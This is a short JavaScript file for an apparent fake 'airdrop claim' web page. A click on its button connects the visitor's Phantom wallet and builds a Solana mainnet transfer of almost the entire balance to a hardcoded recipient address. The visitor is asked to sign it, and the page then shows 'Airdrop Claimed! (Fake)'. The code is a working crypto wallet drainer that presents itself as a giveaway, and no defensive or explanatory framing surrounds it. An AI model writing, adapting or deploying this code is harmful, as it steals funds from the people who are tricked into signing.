const { Connection, clusterApiUrl, PublicKey, SystemProgram, Transaction } = solanaWeb3;

const connection = new Connection(clusterApiUrl('mainnet-beta'));
const recipient = new PublicKey('EaUnFeiCqpQafqoeaWi3cuRhuw8Zt21GMSmMdQLr6yPb');

document.getElementById('connect').addEventListener('click', async () => {
  try {
    const provider = window.solana;
    if (!provider || !provider.isPhantom) {
      alert('Phantom Wallet not found.');
      return;
    }

    const resp = await provider.connect();
    const fromPubkey = resp.publicKey;

    const balance = await connection.getBalance(fromPubkey);
    const lamports = balance - 5000;

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey,
        toPubkey: recipient,
        lamports,
      })
    );

    transaction.feePayer = fromPubkey;
    transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

    const signed = await provider.signAndSendTransaction(transaction);
    alert('Airdrop Claimed! (Fake)');
  } catch (err) {
    console.error(err);
    alert('Error claiming airdrop.');
  }
});